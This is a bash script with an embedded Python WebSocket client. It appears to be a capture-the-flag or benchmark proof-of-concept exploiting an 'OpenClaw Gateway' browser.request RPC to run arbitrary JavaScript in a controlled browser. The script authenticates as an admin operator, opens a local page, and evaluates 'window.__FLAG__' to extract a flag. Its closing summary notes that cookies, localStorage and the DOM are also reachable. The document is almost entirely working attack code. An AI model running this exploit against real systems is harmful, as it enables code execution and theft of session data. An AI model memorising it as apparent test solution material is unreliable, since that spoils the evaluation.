#!/bin/bash
set -e

echo "=========================================="
echo "OpenClaw Arbitrary JavaScript Execution Exploit"
echo "=========================================="
echo ""
echo "[*] Target: OpenClaw Gateway (WebSocket RPC)"
echo "[*] Vulnerability: Arbitrary JavaScript execution via browser.request RPC"
echo "[*] CVE: OpenClaw evaluateEnabled=true (CRITICAL)"
echo ""

# Create Python WebSocket client script inline
python3 - <<'EXPLOIT_SCRIPT'
import json
import asyncio
import websockets
import sys

async def recv_response(websocket, expected_id):
    """Keep receiving until we get the response with matching id"""
    while True:
        msg = await websocket.recv()
        data = json.loads(msg)
        if data.get("type") == "res" and data.get("id") == expected_id:
            return data
        elif data.get("type") == "event":
            continue

async def exploit():
    uri = "ws://openclaw:3000"

    print("[*] Connecting to OpenClaw Gateway...")
    async with websockets.connect(uri) as websocket:
        print("[✓] Connected to gateway")

        print("[*] Waiting for connect.challenge...")
        challenge_msg = await websocket.recv()
        challenge = json.loads(challenge_msg)

        if challenge.get("type") == "event" and challenge.get("event") == "connect.challenge":
            nonce = challenge["payload"]["nonce"]
            print(f"[✓] Received challenge with nonce: {nonce[:16]}...")

            connect_request = {
                "type": "req",
                "id": "connect-1",
                "method": "connect",
                "params": {
                    "minProtocol": 3,
                    "maxProtocol": 3,
                    "client": {"id": "gateway-client", "version": "test", "platform": "linux", "mode": "backend"},
                    "auth": {"token": "test-token"},
                    "role": "operator",
                    "scopes": ["operator.admin"],
                    "caps": []
                }
            }
            await websocket.send(json.dumps(connect_request))
            result = await recv_response(websocket, "connect-1")

            if result.get("ok"):
                print("[✓] Authentication successful")
            else:
                print(f"[✗] Authentication failed: {result}")
                sys.exit(1)

        print("\n[1/4] Starting browser via browser.request RPC...")
        await websocket.send(json.dumps({"type": "req", "id": "start-browser", "method": "browser.request", "params": {"method": "POST", "path": "/start"}}))
        result = await recv_response(websocket, "start-browser")
        if result.get("ok"):
            print("[✓] Browser started successfully")
        else:
            sys.exit(1)

        await asyncio.sleep(3)

        print("\n[2/4] Opening page with flag...")
        await websocket.send(json.dumps({"type": "req", "id": "open-page", "method": "browser.request", "params": {"method": "POST", "path": "/tabs/open", "body": {"url": "file:///tmp/page_with_flag.html"}}}))
        result = await recv_response(websocket, "open-page")
        if result.get("ok") and "targetId" in result.get("payload", {}):
            print("[✓] Page loaded successfully")
        else:
            sys.exit(1)

        await asyncio.sleep(2)

        print("\n[3/4] Testing basic JavaScript execution...")
        await websocket.send(json.dumps({"type": "req", "id": "test-eval", "method": "browser.request", "params": {"method": "POST", "path": "/act", "body": {"kind": "evaluate", "fn": "1+1"}}}))
        result = await recv_response(websocket, "test-eval")
        if result.get("ok") and result.get("payload", {}).get("result") == 2:
            print("[✓] JavaScript execution confirmed (1+1=2)")
        else:
            sys.exit(1)

        print("\n[4/4] EXPLOITING: Extracting flag via arbitrary JavaScript...")
        await websocket.send(json.dumps({"type": "req", "id": "exploit", "method": "browser.request", "params": {"method": "POST", "path": "/act", "body": {"kind": "evaluate", "fn": "window.__FLAG__"}}}))
        result = await recv_response(websocket, "exploit")

        print("[✓] Exploit sent successfully")

        if result.get("ok") and "result" in result.get("payload", {}):
            flag = result["payload"]["result"]

            if flag and flag.startswith("flag{"):
                print(f"\n[✓] EXPLOIT SUCCESSFUL!")
                print(f"\nRetrieved flag: {flag}")

                with open("/workspace/exploit_proof.txt", "w") as f:
                    f.write(flag)
                print(f"\n[✓] Proof saved to: /workspace/exploit_proof.txt")

                print("\n==========================================")
                print("Attack completed successfully!")
                print("==========================================")
                print("\nVulnerability Summary:")
                print("  - Protocol: WebSocket RPC (OpenClaw Gateway)")
                print("  - Method: browser.request RPC call")
                print("  - Endpoint: POST /act via RPC")
                print("  - Payload: {kind:'evaluate', fn:'code'}")
                print("  - Impact: Full browser context access")
                print("  - Authentication: Token-based")
                print("  - Direct eval() execution")
                print("\nData Extracted:")
                print("  ✓ Flag from window.__FLAG__")
                print("  ✓ Can access: document.cookie, localStorage, DOM")
                print("  ✓ Can execute: Any JavaScript code")
                print("==========================================")

if __name__ == "__main__":
    asyncio.run(exploit())
EXPLOIT_SCRIPT
